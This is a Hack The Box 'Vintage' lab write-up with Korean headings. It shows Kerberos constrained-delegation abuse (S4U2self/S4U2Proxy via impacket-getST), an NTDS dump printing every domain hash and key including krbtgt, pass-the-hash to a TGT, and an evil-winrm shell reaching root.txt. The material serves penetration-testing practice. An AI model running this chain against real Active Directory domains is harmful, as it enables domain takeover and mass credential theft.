## KDC_ERR_BADOPTION 발생시

```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user fs01$ or initial TGT not forwardable

```

티켓 발급할 때 -f 옵션으로 명시적으로 실행

```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ kdestroy
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ kinit -f 'fs01$@VINTAGE.HTB'
Password for fs01$@VINTAGE.HTB: 
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ klist -f                    
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
03/20/2026 10:14:51  03/20/2026 20:14:51  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 03/21/2026 10:14:48, Flags: FRIA
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

```

dc01 티켓발급
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache 
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache 

```

관리자 hash 획득
```bash
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache --ntds --user administrator
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache 
SMB         dc01.vintage.htb 445    dc01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         dc01.vintage.htb 445    dc01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.vintage.htb 445    dc01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::                                                                                           
SMB         dc01.vintage.htb 445    dc01             [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/dc01_dc01.vintage.htb_2026-03-20_103358.ntds of which 1 were added to the database
SMB         dc01.vintage.htb 445    dc01             [*] To extract only enabled accounts from the output file, run the following command:
SMB         dc01.vintage.htb 445    dc01             [*] cat /home/kali/.nxc/logs/ntds/dc01_dc01.vintage.htb_2026-03-20_103358.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc01.vintage.htb 445    dc01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc01_dc01.vintage.htb_2026-03-20_103358.ntds | cut -d ':' -f1

```

전체 덤프
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache impacket-secretsdump 'vintage.htb/dc01$@dc01.vintage.htb' -dc-ip dc01.vintage.htb -k -no-pass 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:888c56f39835511544d9937733e12301:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:97cfb75bbec2028f1c97975a5ab58e82:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
krbtgt:des-cbc-md5:e923e308752658df
M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
M.Rossi:des-cbc-md5:7f2c7c982cd64361
R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
R.Verdi:des-cbc-md5:34464a58618f8938
L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
L.Bianchi:des-cbc-md5:01f2d667a19bce25
G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
G.Viola:des-cbc-md5:7f19b9cde5dce367
C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
C.Neri:des-cbc-md5:9da708a462b9732f
P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
P.Rosa:des-cbc-md5:a423fe64579dae73
svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
svc_sql:des-cbc-md5:2ff4022a68a7834a
svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
svc_ldap:des-cbc-md5:e3c48675a4671c04
svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
svc_ark:des-cbc-md5:6e2c9b15bcec6e25
C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
L.Bianchi_adm:aes256-cts-hmac-sha1-96:3e5e1dbefdeb326c9570128306503245e19a6d4d683454257448ca1fe949c617
L.Bianchi_adm:aes128-cts-hmac-sha1-96:89c7c54e022aba2e336ccad66d680afd
L.Bianchi_adm:des-cbc-md5:1545268ab9ba98cd
DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
DC01$:des-cbc-md5:c4f15ef8c4f43134
gMSA01$:aes256-cts-hmac-sha1-96:41f09d5c9b1a1b024c793928bdd260dba20b1c534eb9eaf53b702c6d4afc969d
gMSA01$:aes128-cts-hmac-sha1-96:faf45adf9b5fce2b63d41d756761bbb3
gMSA01$:des-cbc-md5:9d9801325e0dbc5e
FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
FS01$:des-cbc-md5:dafb3738389e205b
[*] Cleaning up... 

```

관리자 TGT 발급 후 evil-winrm 시도 시 로그인 제한됨
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getTGT vintage.htb/administrator@dc01.vintage.htb -hashes :468c7497513f8243b59980f2240a10de   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator@dc01.vintage.htb.ccache
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ KRB5CCNAME=administrator@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied                                                                                       
Success                                                                                                            
                                                                                                                   
                                        
Error: Exiting with code 1
malloc_consolidate(): unaligned fastbin chunk detected
zsh: IOT instruction  KRB5CCNAME=administrator@dc01.vintage.htb.ccache evil-winrm -i  -r vintage.ht

```

administrator 로그인 제한 확인
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u Administrator -H 468c7497513f8243b59980f2240a10de -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:468c7497513f8243b59980f2240a10de STATUS_LOGON_TYPE_NOT_GRANTED

```


L.BIANCHI_ADM 계정 시도
![[Pasted image 20260320104729.png]]


```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getTGT vintage.htb/L.Bianchi_adm@dc01.vintage.htb -hashes :888c56f39835511544d9937733e12301
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in L.Bianchi_adm@dc01.vintage.htb.ccache

```

evil-winrm 인증 성공
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ KRB5CCNAME=L.Bianchi_adm@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc''for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> 

```

root.txt 획득
![[Pasted image 20260320105012.png]]
``